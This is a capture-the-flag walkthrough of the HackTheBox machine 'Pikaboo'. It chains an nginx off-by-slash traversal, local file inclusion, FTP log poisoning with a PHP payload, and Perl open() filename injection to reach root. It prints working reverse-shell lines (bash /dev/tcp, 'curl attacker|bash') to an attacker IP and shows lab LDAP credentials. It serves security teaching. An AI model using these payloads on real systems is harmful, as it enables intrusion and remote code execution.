# HackTheBox: Pikaboo — Comprehensive Walkthrough

**Target IP:** `10.129.95.191`  
**Attacker IP:** `10.10.16.84`  
**Difficulty:** Hard  
**Flags:**
- User: `5869f[redacted]dd2910b2`
- Root: `69b057[redacted]6454314a`

---

## Table of Contents
1. [Phase 0: The Hacker Mindset Before Starting](#phase-0-the-hacker-mindset-before-starting)
2. [Phase 1: Enumeration — Mapping the Attack Surface](#phase-1-enumeration--mapping-the-attack-surface)
3. [Phase 2: The Web — Finding the Nginx Misconfiguration](#phase-2-the-web--finding-the-nginx-misconfiguration)
4. [Phase 3: Off-By-Slash — Understanding the Vulnerability](#phase-3-off-by-slash--understanding-the-vulnerability)
5. [Phase 4: LFI — Turning a Page Parameter into File Reading](#phase-4-lfi--turning-a-page-parameter-into-file-reading)
6. [Phase 5: FTP Log Poisoning — Getting Code Execution](#phase-5-ftp-log-poisoning--getting-code-execution)
7. [Phase 6: Shell as www-data](#phase-6-shell-as-www-data)
8. [Phase 7: Privilege Escalation Enumeration](#phase-7-privilege-escalation-enumeration)
9. [Phase 8: LDAP — Finding Hidden Credentials](#phase-8-ldap--finding-hidden-credentials)
10. [Phase 9: Perl Open() Injection — The Root Path](#phase-9-perl-open-injection--the-root-path)
11. [Lessons Learned](#lessons-learned)

---

## Phase 0: The Hacker Mindset Before Starting

Before typing a single command, understand this: **hacking is about connecting dots.** No single vulnerability on this box gives you root. The path to victory is a chain of small findings, each one opening the door to the next. Your job is to:

1. **Enumerate everything** — services, versions, headers, error messages, file paths.
2. **Question anomalies** — If something looks weird, investigate it. Weird is where bugs live.
3. **Abuse trust boundaries** — Reverse proxies, cronjobs, and scripts that run with higher privileges are your friends.
4. **Think like the developer** — How would YOU build this? What shortcuts would you take? Where would you mess up?

On Pikaboo, the entire chain starts with one weird detail: the error page says "Apache on 127.0.0.1:81" but Nmap says nginx. That mismatch is our first dot.

---

## Phase 1: Enumeration — Mapping the Attack Surface

### Step 1.1: Full Port Scan

```bash
nmap -p- --min-rate 10000 10.129.95.191
```

**Why this command?**
- `-p-` scans all 65,535 TCP ports. We don't assume only "common" ports are open.
- `--min-rate 10000` sends packets fast. We want speed; we're on a CTF timer (or just impatient).

**Hacker Mindset:** If you only scan top 1000 ports, you miss custom services. Admins hide SSH on port 2222, HTTP on 8080, etc. Always scan everything.

**Result:** Only 3 ports open:
- `21/tcp` — FTP (vsftpd 3.0.3)
- `22/tcp` — SSH (OpenSSH 7.9p1 Debian 10)
- `80/tcp` — HTTP (nginx 1.14.2)

### Step 1.2: Service Version Scan

```bash
nmap -p 21,22,80 -sCV 10.129.95.191
```

**Why this command?**
- `-sC` runs default NSE scripts (gives us FTP anon check, HTTP title, SSH hostkeys).
- `-sV` fingerprints versions. Specific versions have known exploits.

**Hacker Mindset:** Version numbers tell a story. OpenSSH 7.9p1 on Debian 10 means this is a Buster box. vsftpd 3.0.3 has no public RCE, but we note it. nginx 1.14.2 is old — worth checking for misconfigurations.

**Result:** Nothing immediately exploitable. FTP doesn't allow anonymous login. SSH is patched. nginx is old but not publicly vulnerable.

**What do we do now?** We dig into the web application. The real attack surface is rarely the service itself — it's how the service is configured.

---

## Phase 2: The Web — Finding the Nginx Misconfiguration

### Step 2.1: Browse the Website

Visit `http://10.129.95.191/`. We see a "Pikaboo" Pokemon clone site with three links:
- `/pokatdex.php` — Monster gallery
- `/contact.php` — A contact form (button doesn't work)
- `/admin` — HTTP Basic Authentication popup

**Hacker Mindset:** Every endpoint is a clue. The `.php` extensions tell us this is a PHP application. The `/admin` endpoint with basic auth is interesting — not because we can guess the password (we can't), but because of what happens when we **fail** to authenticate.

### Step 2.2: Click "Cancel" on the Auth Dialog

When you hit Cancel on the `/admin` basic auth, you get an error page. Read it carefully.

**What does it say?**
> "Unauthorized. This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required. Additionally, a 401 Unauthorized error was encountered while trying to use an ErrorDocument to handle the request. **Apache/2.4.38 (Debian) Server at 127.0.0.1:81 Port 81**"

**Hacker Mindset — Why is this gold?**

We have a **major architectural mismatch**:
- Nmap says port 80 is **nginx**.
- The error says **Apache on 127.0.0.1:81**.

This means: **nginx is a reverse proxy**, forwarding requests to Apache running locally on port 81. This is a common setup, but reverse proxies are where misconfigurations hide. When two web servers parse the same URL differently, you get parser differential attacks.

**Key questions to ask:**
1. How does nginx decide what to forward to Apache?
2. What happens if we send nginx a URL that Apache interprets differently?
3. Are there any `location` blocks in nginx that might be misconfigured?

---

## Phase 3: Off-By-Slash — Understanding the Vulnerability

### Step 3.1: What is Off-By-Slash?

This is a classic nginx misconfiguration discovered by Orange Tsai. It happens when an nginx config looks like this:

```nginx
location /admin {
    proxy_pass http://127.0.0.1:81/;
}
```

Notice: `location /admin` has **no trailing slash**, but `proxy_pass` has a **trailing slash**.

**Why does this matter?**

When you visit `/admin`, nginx forwards to `http://127.0.0.1:81/`. That's fine.

When you visit `/adminnew`, nginx still matches `/admin` (because `/admin` is a prefix match without a trailing slash). It forwards to `http://127.0.0.1:81/new`. The writeup noted that `/adminnew` returned 401, proving the prefix match.

But what about `/admin../`?

Nginx sees `/admin` as the matched prefix, strips it, and forwards the rest (`../`) to Apache. So `/admin../something` becomes `http://127.0.0.1:81/../something`.

Apache then normalizes `../` and traverses up a directory!

**Hacker Mindset:** This is parser differential logic. Nginx and Apache disagree on what the URL means. Nginx thinks "strip `/admin`, forward the rest." Apache thinks "oh, `../`? Let me go up a directory." We abuse this disagreement.

### Step 3.2: Testing the Theory

```bash
curl -I http://10.129.95.191/admin../server-status
```

**Why `server-status`?**
- Apache's `server-status` page is usually restricted to localhost.
- But our request IS coming from localhost — because nginx proxies it.

**Result:** `HTTP/1.1 200 OK`

We just accessed Apache's `server-status` from the internet by abusing the off-by-slash. This confirms the vulnerability.

### Step 3.3: Finding the Hidden Admin Panel

Looking at `server-status`, we see requests to `/admin_staging`. This is a hidden staging area.

```bash
curl -I http://10.129.95.191/admin../admin_staging/
```

**Result:** `HTTP/1.1 200 OK`

We now have access to an admin dashboard that was never meant to be public.

**Hacker Mindset:** Always check `server-status` when you find Apache behind a proxy. It's a goldmine of internal URLs, IPs, and request patterns. Even if you can't exploit it directly, it tells you what exists.

---

## Phase 4: LFI — Turning a Page Parameter into File Reading

### Step 4.1: Spotting the LFI Pattern

In the staging panel, clicking "User Profile" loads:
```
http://10.129.95.191/admin../admin_staging/index.php?page=user.php
```

**Hacker Mindset:** The `?page=` parameter is screaming "file inclusion." This is a very common PHP anti-pattern. The code probably looks like:

```php
include($_GET['page']);
```

Or slightly better:
```php
include($_GET['page'] . '.php');
```

But since the URL already has `.php` on the end (`page=user.php`), the developer is likely just doing `include($_GET['page'])` directly. This means we might be able to include **any file**, not just PHP files.

### Step 4.2: Testing LFI

First, try the obvious:
```bash
curl http://10.129.95.191/admin../admin_staging/index.php?page=/etc/passwd
```

**Result:** Fails. No output.

**Hacker Mindset:** Don't give up on the first failure. LFI restrictions are common. Maybe:
- The path is prefixed (e.g., `/var/www/html/pages/` + our input)
- There's a suffix (e.g., our input + `.php`)
- There's a path traversal limit
- The web server doesn't have read permissions on `/etc/passwd`

Try local files first:
```bash
curl http://10.129.95.191/admin../admin_staging/index.php?page=contact.php
```

**Result:** The contact page content appears inside the dashboard. LFI confirmed.

Try going up directories:
```bash
curl http://10.129.95.191/admin../admin_staging/index.php?page=../../../var/log/dpkg.log
```

**Result:** We can read `/var/log/dpkg.log`. So we can read `/var/log/*` but not `/etc/*`.

**Why?** The web server likely runs in a directory like `/var/www/html/admin_staging/`. Going up 3 levels gets us to `/var/`, and from there we can reach `log/`. But `/etc/` is too far or blocked by permissions.

**Hacker Mindset:** When `/etc/passwd` fails, ask "what CAN I read?" Log files, config files in `/var/`, application files — anything readable is useful. On this box, the jackpot is `/var/log/vsftpd.log` because we know FTP is running and logging.

### Step 4.3: Confirming the Log File

```bash
curl http://10.129.95.191/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

**Result:** We see FTP connection logs, including usernames from failed login attempts.

**Hacker Mindset:** This is the bridge to code execution. If we can write PHP code into a file that gets `include()`'d, the PHP engine will execute it. Logs are perfect because:
1. We control the input (the FTP username is logged verbatim).
2. The log file is readable by the web server.
3. The LFI includes the log file as PHP code, not as text.

---

## Phase 5: FTP Log Poisoning — Getting Code Execution

### Step 5.1: How Log Poisoning Works

PHP's `include()` function doesn't just dump file contents — it **executes PHP code** inside the included file. So if `/var/log/vsftpd.log` contains:

```
Thu Jul 8 17:17:47 2021 [pid 14106] FTP command: Client "::ffff:10.10.14.6", "USER <?php system('id'); ?>"
```

When PHP includes this log file, it sees `<?php system('id'); ?>` and **executes it**. The rest of the log text is just treated as HTML.

**Hacker Mindset:** Log poisoning is one of the oldest tricks in the book, but it requires three conditions:
1. You can write arbitrary text into a log (controlled input).
2. The log file is readable via LFI.
3. The included file is processed by PHP (not just echoed as text).

On this box, all three conditions are met perfectly.

### Step 5.2: Testing Code Execution

```bash
ftp 10.129.95.191
Name: <?php system('id'); ?>
Password: anything
```

Then trigger the LFI:
```bash
curl http://10.129.95.191/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

**Result:** The page contains `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

**We have code execution.**

---

## Phase 6: Shell as www-data

### Step 6.1: Upgrading from Code Execution to a Shell

Code execution is nice, but a real shell is better. We need a reverse shell payload that:
1. Works in PHP's `system()`.
2. Doesn't get mangled by the FTP client or log format.
3. Connects back to our attacker machine.

**Payload:**
```php
<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.84/443 0>&1"'); ?>
```

**Why this payload?**
- `bash -c "bash -i ..."` ensures we get an interactive bash shell.
- `/dev/tcp/` is a bash builtin for TCP connections — no external tools needed.
- `0>&1` redirects stdin to the same socket, giving us a full duplex connection.

**Steps:**
1. Start listener: `nc -lnvp 443`
2. FTP login with the PHP payload as username.
3. Curl the LFI URL to trigger execution.
4. Catch the shell.

### Step 6.2: Upgrading the TTY

The initial shell is janky — no tab completion, no history, Ctrl+C kills it. Fix it:

```bash
python3 -c 'import pty;pty.spawn("bash")'
```

Then press `Ctrl+Z` to background nc. In your Kali terminal:
```bash
stty raw -echo; fg
```

Then type `reset` and set terminal to `xterm`.

**Why do this?** A proper TTY lets you use `su`, `nano`, `vim`, and handle interactive programs. Without it, many commands break.

### Step 6.3: Grab User Flag

```bash
cat /home/pwnmeow/user.txt
```

**Flag:** `5869f5[redacted]dd2910b2`

---

## Phase 7: Privilege Escalation Enumeration

### Step 7.1: Check Cronjobs

```bash
cat /etc/crontab
```

**Result:**
```
* * * * * root /usr/local/bin/csvupdate_cron
```

A script running as **root every single minute**.

**Hacker Mindset:** Cronjobs are privilege escalation heaven. Any script running as root that we can influence is a direct path to root. Always check `/etc/crontab`, `/etc/cron.d/`, and user crontabs.

### Step 7.2: Analyze the Cron Script

```bash
cat /usr/local/bin/csvupdate_cron
```

```bash
#!/bin/bash
for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

**What does this do?**
1. Loops over every directory in `/srv/ftp/`.
2. `cd`s into each one.
3. Runs `/usr/local/bin/csvupdate [directory_name] *csv`.
4. Deletes everything in the directory.

**Why is this suspicious?**
- It runs as root.
- It processes user-controlled files (`*csv` wildcard expansion).
- It calls another script (`csvupdate`) which we need to inspect.

### Step 7.3: Analyze csvupdate

```bash
file /usr/local/bin/csvupdate
head -n 30 /usr/local/bin/csvupdate
```

It's a **Perl script**. The critical part is at the end:

```perl
shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}
```

**Hacker Mindset:** The `for(<>)` loop in Perl is extremely dangerous when `@ARGV` contains user-controlled filenames. Perl's `open()` function has a "feature":
- If a filename starts with `|`, it's treated as a command to execute.
- If a filename ends with `|`, the output of the command is read.

This means if we can create a file named `|id`, Perl will execute `id` when it tries to open it.

**But there's a catch:** We don't have FTP access yet. The `/srv/ftp/*` directories are owned by `root:ftp` with permissions `drwx-wx---`. Only root and the `ftp` group can write to them. We need to find a way in.

---

## Phase 8: LDAP — Finding Hidden Credentials

### Step 8.1: Find the Config File

While enumerating as `www-data`, we find `/opt/pokeapi/`. This is the "under construction" API mentioned on the main site. Inside:

```bash
cat /opt/pokeapi/config/settings.py
```

**Jackpot:**
```python
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    ...
}
```

**Hacker Mindset:** Developers hardcode credentials. Always grep for `password`, `passwd`, `secret`, `key` in config files. Django apps, WordPress configs, `.env` files — they're all treasure chests.

### Step 8.2: Enumerate LDAP

LDAP is running on `127.0.0.1:389`. We have valid bind credentials. Dump everything:

```bash
ldapsearch -h 127.0.0.1 -x -b 'dc=htb' -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g'
```

**Result:** We find the user `pwnmeow` with a base64-encoded password:
```
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
```

### Step 8.3: Decode the Password

```bash
echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
```

**Result:** `_G0tT4_C4tcH_'3m_4lL!_`

**Hacker Mindset:** Base64 is not encryption. It's encoding. Never assume `userPassword::` means it's hashed. Always try `base64 -d` first.

### Step 8.4: Test FTP Access

```bash
ftp 10.129.95.191
Name: pwnmeow
Password: _G0tT4_C4tcH_'3m_4lL!_
```

**Result:** Login successful. We now have write access to `/srv/ftp/*` directories.

---

## Phase 9: Perl Open() Injection — The Root Path

### Step 9.1: Understanding the Vulnerability

Perl's `open()` function is ancient and dangerous. When you do:

```perl
open(my $fh, ">>", $filename)
```

Perl checks if `$filename` starts with `|`. If so, instead of opening a file, it **executes the rest as a shell command**.

In our case, the Perl script does `for(<>)`, which implicitly calls `open()` on every element in `@ARGV`. The `@ARGV` comes from the bash wildcard `*csv`.

**The exploit chain:**
1. We upload a file with a name starting with `|`.
2. The cron runs: `csvupdate types *csv`.
3. Bash expands `*csv` to our malicious filename.
4. Perl's `for(<>)` tries to "open" it.
5. The command executes as **root**.

### Step 9.2: The Filename Challenge

Here's the problem: **we cannot use `/` in our payload**.

Why? Because `/` is a directory separator in Linux. You cannot create a file named `bash -c "bash -i >& /dev/tcp/..."` because the `/` characters would be interpreted as directory paths.

**Hacker Mindset:** When you hit a restriction, find a way around it. We need a reverse shell without using `/` in the filename itself. The solution: **let something else handle the `/` for us.**

**Solution 1: Use `curl`**
- Filename: `|curl 10.10.16.84:9000|bash; a.csv`
- No `/` in the filename!
- The `/` is only in the downloaded script, which is executed by `bash`.

**Solution 2: Base64 encoding**
- Filename: `|echo <base64>|base64 -d|bash; a.csv`
- The base64 string contains no `/`.
- When decoded, it produces the reverse shell with `/` characters.

We used **Solution 1** because it's simpler to debug (you see the HTTP request hit your server).

### Step 9.3: Setting Up the Attack

**Step 1 — Create the payload file on Kali:**
```bash
echo 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1' > index.html
```

**Why `index.html`?** When `curl` hits `http://10.10.16.84:9000` without a path, it requests `/` by default. Python's HTTP server will serve `index.html` for the root path.

**Step 2 — Start the HTTP server:**
```bash
python3 -m http.server 9000
```

**Step 3 — Start the reverse shell listener:**
```bash
nc -lnvp 4444
```

**Step 4 — Create a dummy local file for FTP:**
```bash
touch test.txt
```

**Why do we need `test.txt`?** The `put` command requires a local file to upload. We don't care about its contents — only the remote filename matters.

**Step 5 — Upload the malicious file:**
```bash
ftp 10.129.95.191
# login as pwnmeow
ftp> cd types
ftp> put test.txt "|curl 10.10.16.84:9000|bash; a.csv"
ftp> quit
```

**Why `types`?** The cron script does `$(basename $d)` where `$d` is the directory name. Perl checks if `types` exists in its `%csv_fields` hash. It does (value: 4). If we picked an invalid directory, Perl would die before reaching our file.

**Why does the filename end with `a.csv`?** Because the bash glob `*csv` must match it. `a.csv` ends with `csv`, so it matches.

**Why the `;` before `a.csv`?** It's a bash command separator. The actual command executed is:
```bash
curl 10.10.16.84:9000 | bash
```
The `; a.csv` is just junk that bash ignores after the pipeline finishes.

### Step 9.4: Catching Root

Wait up to 60 seconds. The cron runs every minute.

**What happens:**
1. Cron executes `csvupdate types *csv`.
2. `*csv` expands to `|curl 10.10.16.84:9000|bash; a.csv`.
3. Perl's `for(<>)` calls `open()` on this filename.
4. Because it starts with `|`, Perl executes: `curl 10.10.16.84:9000 | bash`.
5. `curl` downloads our `index.html` containing the reverse shell.
6. `bash` executes it.
7. We get a root shell on `nc -lnvp 4444`.

**Result:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.95.191] 43726
root@pikaboo:/srv/ftp/types# id
uid=0(root) gid=0(root) groups=0(root)
```

### Step 9.5: Grab Root Flag

```bash
cat /root/root.txt
```

**Flag:** `69b057[redacted]454314a`

---

## Lessons Learned

### Technical Lessons
1. **Off-by-Slash:** Always test for path traversal when you see nginx proxying to Apache. A missing `/` in a `location` block is catastrophic.
2. **LFI + Log Poisoning:** If you can read logs and control input that goes into those logs, you have code execution.
3. **Perl `open()` injection:** The diamond operator `<>` in Perl is dangerous with untrusted filenames. A leading `|` turns a file open into command execution.
4. **Hardcoded Credentials:** Config files in `/opt/`, `/var/www/`, and application directories are prime targets for credential harvesting.

### Hacker Mindset Lessons
1. **Anomalies are clues.** The Apache/nginx mismatch was the first domino.
2. **Don't give up on the first failure.** `/etc/passwd` didn't work for LFI, but `/var/log/vsftpd.log` did.
3. **Restrictions breed creativity.** Not being able to use `/` forced us to use `curl` and a web server — a classic redirection attack.
4. **Chain everything.** No single exploit owned this box. It took: nginx bypass → LFI → log poisoning → LDAP creds → FTP access → Perl injection.

---

*Happy hacking!* 
